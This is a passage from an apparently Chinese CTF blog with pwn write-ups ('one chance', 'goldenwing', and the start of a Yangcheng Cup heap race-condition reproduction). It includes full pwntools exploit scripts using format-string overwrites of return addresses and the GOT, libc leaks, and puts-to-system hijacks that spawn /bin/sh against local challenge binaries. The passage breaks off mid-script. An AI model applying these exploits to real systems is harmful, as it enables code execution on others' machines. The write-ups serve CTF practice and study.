p64(leave_ret)<br><br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="25-one-chance"><a href="#25-one-chance" class="headerlink" title="25 one chance"></a>25 one chance</h4><p>保护全开，有后门，用格式化字符串修改返回地址。由于buf在bss段上，还是非栈上的修改。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301716995.png" alt="image-20240930171556825"></p><p>由于vuln的返回地址与后门只差一个字节，只需要改一个字节的返回地址就好。</p><p>又是一场三连的修改，与where is fmt一样。但是这个只能修改一次。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301738979.png" alt="image-20240930173858925"></p><p>stack1偏移：6+9 &#x3D; 15</p><p>stack2偏移：6+0x27 &#x3D; 45</p><p>直接合一起改不过去。。。</p><p>看看提示，什么时候解析的。唔，动调看看，只看出在一个std_out函数一键输出了，其他没看出来。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301759505.png" alt="image-20240930175952441"></p><p>这里又call了一次</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301805326.png" alt="image-20240930180514275"></p><p>这个不知道call了什么</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301806882.png" alt="image-20240930180655823"></p><p>经历了漫长的调试，欸？</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301808199.png" alt="image-20240930180858145"></p><p>将payload1与payload2交换位置，发现它们两个的修改是同时发生的，不管怎么交换位置，修改的情况一样，，，</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301817555.png" alt="image-20240930181703519"></p><p>不应该呀，依稀记得以前的是逐个加的，回头看了一眼以前栈上逐个加的笔记，上一次的%c的个数对下一次是有影响的啊。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409301823236.png" alt="image-20240930182338158"></p><p>再仔细想想提示，再结合动调的时候发现栈的空间变化，地址是被单独取出来的。也就是说在进入printf的时候，提取了对应位置的栈的地址。</p><p>（貌似是带$的先提取，用%号的后面一点点提取）</p><p>搜了半天参考了这个博客<a href="https://zikh26.github.io/posts/a523e26a.html">一次有趣的格式化字符串漏洞利用 | ZIKH26’s Blog</a>，发现本题是博客这个题的简化版本。</p><p>成了！</p><p>不过要注意的是，博客里用了%p，输出了9个，每次输出是10个字符，所以减了90，但是我这里由于有的是空的，就不用%p了，用了%c。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./one_chance&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">42119</span>)<br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>back_addr = <span class="hljs-number">0x1210</span><br>vuln_ret_main = <span class="hljs-number">0x12cf</span><br><br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack_addr))<br><span class="hljs-comment">#debug()</span><br>vuln_ret_stack = stack_addr + <span class="hljs-number">0x18</span><br>offset1 = vuln_ret_stack &amp; <span class="hljs-number">0xffff</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(offset1))<br>offset2 = <span class="hljs-number">0x10010</span> - offset1<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(offset2))<br><br>payload1 = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(offset1-<span class="hljs-number">13</span>) +<span class="hljs-string">&#x27;c%hn&#x27;</span><br>payload2 = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(offset2) + <span class="hljs-string">&#x27;c%45$hhn&#x27;</span><br>payload = <span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">13</span>+payload1+payload2<br>payload = payload.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>sd(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="26-goldenwing"><a href="#26-goldenwing" class="headerlink" title="26 goldenwing"></a>26 goldenwing</h4><p>共有4(5)个选项</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031529091.png" alt="image-20241003152924020"></p><p>1：显示状态</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031529452.png" alt="image-20241003152941385"></p><p>2:加体力和力量（只能一次）血最多+100，攻击最多加10，且只能进行一次。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031530646.png" alt="image-20241003153016582"></p><p>3：打怪：</p><p>就是比较攻击与血量互相攻击，不截图了，胜利之后有两次格式化字符串。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031532058.png" alt="image-20241003153251959"></p><p>4：退出</p><p>3405691582：god？写入s中，0x20个字节</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031535849.png" alt="image-20241003153502787"></p><p>发现状态比较都是无符号整数，直接用-100000增加力量和生命来打败boss</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031549620.png" alt="image-20241003154916553"></p><p>magic位于bss端上，非栈上格式化字符串</p><p>6+0x25 &#x3D; 43泄露出libc地址。</p><p>按照题25的思路，第二次输入时将返回的地址改为这个success函数的对i置0的位置，从而实现不限次数的格式化字符串</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>stack1_addr = stack2_addr - <span class="hljs-number">0</span>x20<br>stack3_addr = stack1_addr + <span class="hljs-number">8</span><br>offset = stack3_addr&amp;<span class="hljs-number">0</span>xff<br>offset2 = <span class="hljs-number">0</span>x1158e-offset<br>payload = <span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">6</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(offset-<span class="hljs-number">6</span>)+<span class="hljs-string">&#x27;c%hhn&#x27;</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(offset2)+<span class="hljs-string">&#x27;c%12$hn&#x27;</span><br><span class="hljs-function"><span class="hljs-title">sd</span><span class="hljs-params">(payload)</span></span><br><br></code></pre></td></tr></table></figure><p>从上至下：</p><p>stack1,stack3,stack2,stack4</p><p>8           9          12          13</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031635572.png" alt="image-20241003163536515"></p><p>由于leave_ret一次后rbp链会变化，即使从push开始也是。。</p><p>那，，直接回fight开始呢，试一试。可以，但是如果想要改got的话，总是动返回地址会很麻烦，刚好也有另一条三连的链，用那个更好用。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031704505.png" alt="image-20241003170415436"></p><p>这里magic2之后才输入，但是总是接收不到，get到一个小技巧，用interactive来截断。由于4字节输入太大了会崩掉，那就分批输入。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031844858.png" alt="image-20241003184425810"></p><p>那么可以考虑分字节输入puts的got表里，但是重复的时候也会执行puts函数，不能重调后再使用这条链，所以还是需要用到下面的三连链。。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031906999.png" alt="image-20241003190645941"></p><p>从上到下：7、5、6</p><p>stack5_addr:0x26+6&#x3D;44</p><p>stack6_addr:0x35+6&#x3D;59</p><p>stack7_addr:0x19+6&#x3D;31</p><p>辛辛苦苦改成system之后，发现会卡死。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032019428.png" alt="image-20241003201954347"></p><p>因为改动过rbp的指向，导致不能正常回退，那就改成用read,再手调到偏转到god。</p><p>不对，最后一次的多次更改可以再加一个，把返回地址跳转走就好</p><p>这里手动修复过去，但是忘了最先开始是啥了，调一下看看。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032031341.png" alt="image-20241003203125263"></p><p>找到了</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032033229.png" alt="image-20241003203317184"></p><p>不能直接回到这里，这是回去后的第一个puts，要去第二个。（其实是别的问题，回到system参数错误也是没问题的）</p><p>否则：</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032039258.png" alt="image-20241003203909206"></p><p>由于rbp动歪了，导致&#x2F;bin&#x2F;sh字符串偏离了。。。</p><p>尝试改read，跳转，但是还是歪了。。</p><p>还是用puts改吧，至少不会因此中断程序，但是，，puts改为system后，不方便调试，每次一到对应的地方就卡断了。。</p><p>不过既然可以跳转回来再运行success，可以在这里纠正一次got。。</p><p>纠正完之后，终于本地通了。。。。。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032144974.png" alt="image-20241003214454907"></p><p>折磨死算了。</p><p>exp:</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./goldenwing&#x27;)<br>p=remote(&#x27;127.0.0.1&#x27;,33395)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br>puts_got = 0x4020+0x10000<br>magic_addr = 0x401564<br>sd(b&#x27;\n&#x27;)<br>ru(&#x27;?&#x27;)<br>sl(&#x27;3405691582&#x27;)<br>rl()<br>sd(&#x27;/bin/sh\x00\x00&#x27;)<br><br>ru(&#x27;?&#x27;)<br>sl(&#x27;2&#x27;)<br>rl()<br>sl(&#x27;-100000&#x27;)<br>rl()<br>sl(&#x27;-100000&#x27;)<br>ru(&#x27;?&#x27;)<br>sl(&#x27;3&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><br>payload = &#x27;%43$p&#x27;<br>payload = payload.ljust(8,&#x27;a&#x27;)<br>payload += &#x27;%8$p&#x27;<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sd(payload)<br>ru(&#x27;0x&#x27;)<br><br>libc_main = int(rc(12),16)<br>offset = 0x7fa3b1e29e40 -  0x7fa3b1e00000<br>libc_base = libc_main-offset<br>print(hex(libc_base))<br><br>ru(&#x27;aaa&#x27;)<br>stack2_addr = int(rc(14),16)<br>print(hex(stack2_addr))<br><br>stack1_addr = stack2_addr - 0x20<br>stack3_addr = stack1_addr + 8<br>stack4_addr = stack2_addr + 8<br><br>stack5_addr = stack1_addr - 0x10 + 0x130<br>stack6_addr = stack1_addr - 0x10 + 0x198<br>stack7_addr = stack1_addr - 0x10 + 0xc8<br>rbp_true = stack1_addr + 0x70<br>def magic(flag=1):<br>    if flag==1:<br>        offset = stack3_addr&amp;0xffff<br>        offset2 = 0x11632-offset<br>        payload = &#x27;%c&#x27;*6+&#x27;%&#x27;+str(offset-6)+&#x27;c%hn&#x27;+&#x27;%&#x27;+str(offset2)+&#x27;c%12$hn\x00&#x27;<br>        sd(payload)<br>    if flag==2:<br>        offset = stack3_addr&amp;0xffff<br>        offset2 = 0x11632-offset<br>        offset3 = (stack7_addr&amp;0xffff)+0x10000-0x1632<br>        payload = &#x27;%c&#x27;*6+&#x27;%&#x27;+str(offset-6)+&#x27;c%hn&#x27;+&#x27;%&#x27;+str(offset2)+&#x27;c%12$hn&#x27;+&#x27;%&#x27;+str(offset3)+&#x27;c%44$hn\x00&#x27;<br>        print(payload)<br>        print(hex(offset3))<br>        print(hex(stack7_addr))<br>        <span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">()</span><br>        sd(payload)<br>    if flag==3:<br>        offset = stack3_addr&amp;0xffff<br>        offset2 = 0x11632-offset<br>        offset3 = puts_got-0x1632+2<br>        payload = &#x27;%c&#x27;*6+&#x27;%&#x27;+str(offset-6)+&#x27;c%hn&#x27;+&#x27;%&#x27;+str(offset2)+&#x27;c%12$hn&#x27;+&#x27;%&#x27;+str(offset3)+&#x27;c%59$hn\x00&#x27;<br>        sd(payload)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>magic(2)<br><br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>system_offset = libc.sym[&#x27;system&#x27;]<br>puts_offset = libc.sym[&#x27;puts&#x27;]<br>system_addr = libc_base + system_offset<br>pop_rdi = 0x000000000002a3e5 + libc_base<br>system_12 = system_addr&amp;0xffff<br>system_3 = system_addr&gt;&gt;16&amp;0xff<br><br>print(hex(system_addr))<br>print(hex(system_12))<br>print(hex(system_3))<br><br>def puts_system(puts_got):<br>    offset = stack4_addr &amp;0xffff<br>    offset2 = puts_got - offset<br>    payload = &#x27;%c&#x27;*6+&#x27;%&#x27;+str(offset-6)+&#x27;c%hn&#x27;+&#x27;%&#x27;+str(offset2)+&#x27;c%12$hn\x00&#x27;<br>    sd(payload)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">ru</span><span class="hljs-params">(&#x27;<span class="hljs-variable">magic2</span>&#x27;)</span><br><br>p.interactive()<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sl(&#x27;aaaa&#x27;)<br>magic(3)<br>sleep(1)<br>p.interactive()<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sleep(1)<br>puts_system(puts_got)<br>offset = system_12-system_3<br>offset_ok = 0x17bb - system_12<br><br>p.interactive()<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>payload = &#x27;%&#x27;+str(system_3)+&#x27;c%31$hhn&#x27;+&#x27;%&#x27;+str(offset)+&#x27;c%13$hn&#x27;+ &#x27;%&#x27; + str(offset_ok) + &#x27;c%12$hn\x00&#x27;<br>print(hex(system_addr))<br>print(hex(system_12))<br>print(hex(system_3))<br>print(hex(offset))<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">()</span><br>sleep(1)<br>sd(payload)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">rl</span><span class="hljs-params">()</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">sl</span><span class="hljs-params">(&#x27;3405691582&#x27;)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">sd</span><span class="hljs-params">(&#x27;<span class="hljs-operator">/</span><span class="hljs-variable">bin</span><span class="hljs-operator">/</span><span class="hljs-variable">sh</span>\<span class="hljs-variable">x00</span>&#x27;)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">rl</span><span class="hljs-params">()</span><br>p.interactive()<br><br>sl(&#x27;3&#x27;)<br>offset_fi = rbp_true&amp;0xffff<br>payload = &#x27;%&#x27;+str(offset_fi)+&#x27;c%8$hn&#x27;<br>p.interactive()<br>sd(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>由于次数太多了，本地可以通，远程很难通过，跑着跑着在最后一步就崩掉了。经过崩掉了n次后，可算通了。。。</p><h4 id="27-luosh"><a href="#27-luosh" class="headerlink" title="27 luosh"></a>27 luosh</h4><p>看不懂一点，没思路，结束。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯--heap复现</title>
    <link href="/2024/10/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF--heap%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/10/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF--heap%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="羊城杯–heap复现"><a href="#羊城杯–heap复现" class="headerlink" title="羊城杯–heap复现"></a>羊城杯–heap复现</h2><p>​首先是学会了IDA怎么重定义类型来让堆块的创建变得好看。（真的可以使得看起来很舒服，感谢bilibili的师傅们）</p><p>​本题的利用是条件竞争堆，但是从其中学到了好多其他的调试及技巧。</p><p>​main函数，创建了一个0x100的堆块，将各种数据的操作与传递都塞在了里面，并且不断创建。每次的创建进程及其他操作都是放在了子线程的堆里。</p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925195257600.png" alt="image-20230925195257600"></p><p>​strtok函数：<img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925200512260.png" alt="image-20230925200512260"></p><p>​strtok函数会把字符串中要求检索的标识改为‘\0’（只找到第一个标识），并且内部指针指向’\0’，第二次若以‘0’开始，就会继续裁剪剩下的字符串。</p><p>​如上图的两次strtok达成的效果：3空格aaaaaa\n会被分解成3\0’ <img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925201124856.png" alt="image-20230925201124856">和aaaaaa\0</p><p>free函数：</p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925202616708.png" alt="image-20230925202616708"></p><p>在bss段中为main_arena_list,其中存了第一个子线程堆块的指引。</p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925202758374.png" alt="image-20230925202758374"></p><p>show函数（改了名字是看的真舒服）</p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925202901366.png" alt="image-20230925202901366"></p><p>edit函数</p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925202944909.png" alt="image-20230925202944909"></p><p>关键是这里的sleep可以达成在进程间的延迟，从而达到竞争攻击的效果。</p><p>好，接下里看着脚本分析：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">new</span>(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x62)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x60+<span class="hljs-string">&quot;\xa0\x08&quot;</span>)<br><span class="hljs-attribute">delete</span>(<span class="hljs-number">0</span>)<br><span class="hljs-attribute">new</span>(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x58)<br><span class="hljs-attribute">new</span>(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x58)<br><span class="hljs-attribute">sleep</span>(<span class="hljs-number">2</span>)<br><span class="hljs-attribute">show</span>(<span class="hljs-number">1</span>)<br><span class="hljs-attribute">r</span>.recvuntil(<span class="hljs-string">&quot;paper content: &quot;</span>)<br><span class="hljs-attribute">libc_base</span>=u64(r.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>,drop=True).ljust(<span class="hljs-number">0</span>x8,<span class="hljs-string">&quot;\x00&quot;</span>))-<span class="hljs-number">0</span>x219c80 #main_arena<br></code></pre></td></tr></table></figure><p>要改后三位为8a0的原因是这样：</p><p>​<img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925203636518.png" alt="image-20230925203636518"></p><p>先用arenas找到线程堆的起始部位，然后往下翻，直到它与数据域的交界处</p><p>找到这里，发现main_arena,利用它来泄露libc</p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925203737836.png" alt="image-20230925203737836"></p><p>这里可以分别看到libc的载入基地址， 以及开了Pie的载入基地址，以此来达到寻找位置以及计算固定偏移的效果。</p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925203832033.png" alt="image-20230925203832033"></p><p>​sleep(2)可以使得那个edit里的休眠结束，防止进程竞争发生意外。</p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925210123242.png" alt="image-20230925210123242"></p><p>这里把断点打到了show函数之后（放在前面会由于动调儿而导致进程切换出问题而无法正常达成条件竞争的输出）</p><p>​可以看到，配合new(0x62)或（0x68)以后，delete（这里仅仅是为了达成能够往下修改的效果）,然后连续创建两个（0x58）,可以覆盖0x60,然后刚好达到第二堆块的index_chunk区域，从而修改指针。</p><p>这是连续创建了3个块，可以看出每一个块的结构（这是3个0x62）</p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925211616503.png" alt="image-20230925211616503"></p><p>  另：如果刚好满了，那个出现的24，25啥的会单独占据0x10(这个出现的原因从代码中找不到，它也没被用到，目前存疑）</p><p>再来一次0x62、0x60、0x60</p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925212407082.png" alt="image-20230925212407082"></p><p>这也是为什么明明是0x58个数据，却要用0x60来填的原因。</p><p>另：关于更改index_chunk能够改变输出的原因：Index_chunk指向了数据域，按理说应该输出数据，但是如果改了，就会相应的更改其他位置。</p><p>​后续按照相同的方法更改strsok函数got对应的真实地址，但是由于strtok函数是由一个封装函数，所以直接更改了libc中相应函数的got表所对应函数</p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925224536197.png" alt="image-20230925224536197"></p><p><img src="C:\Users\czy\AppData\Roaming\Typora\typora-user-images\image-20230925224554606.png" alt="image-20230925224554606"></p><p>可能发现的过程：si进入发现got表跳转的第一个函数是它，然后用libc找到相应的位置，进行更改。</p><p>​期待师傅们的指正与交流。</p><p>总exp:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-keyword">p</span>=process(<span class="hljs-string">&#x27;./heap&#x27;</span>)<br>#p=remote(<span class="hljs-string">&#x27;&#x27;</span>,)<br><span class="hljs-keyword">sl</span> = lambda s :<span class="hljs-keyword">p</span>.sendline(s)<br>sd = lambda s :<span class="hljs-keyword">p</span>.send(s)<br>rc = lambda s :<span class="hljs-keyword">p</span>.recv(s)<br><span class="hljs-keyword">ru</span> = lambda s :<span class="hljs-keyword">p</span>.recvuntil(s)<br>rl = lambda   :<span class="hljs-keyword">p</span>.recvline()<br><br>def <span class="hljs-keyword">new</span>(content):<br>    <span class="hljs-keyword">p</span>.recv()<br>    payload = <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;1 &#x27;</span>+content<br>    <span class="hljs-keyword">sl</span>(payload)<br><br>def show(<span class="hljs-built_in">index</span>):<br>    <span class="hljs-keyword">p</span>.recv()<br>    payload = <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;2 &#x27;</span>+<span class="hljs-built_in">index</span><br>    <span class="hljs-keyword">sl</span>(payload)<br><br>def <span class="hljs-keyword">edit</span>(<span class="hljs-built_in">index</span>,content):<br>    <span class="hljs-keyword">p</span>.recv()<br>    payload = <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;3 &#x27;</span>+<span class="hljs-built_in">index</span>+<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;:&#x27;</span>+content<br>    <span class="hljs-keyword">sl</span>(payload)<br><br>def dele(<span class="hljs-built_in">index</span>):<br>    <span class="hljs-keyword">p</span>.recv()<br>    payload 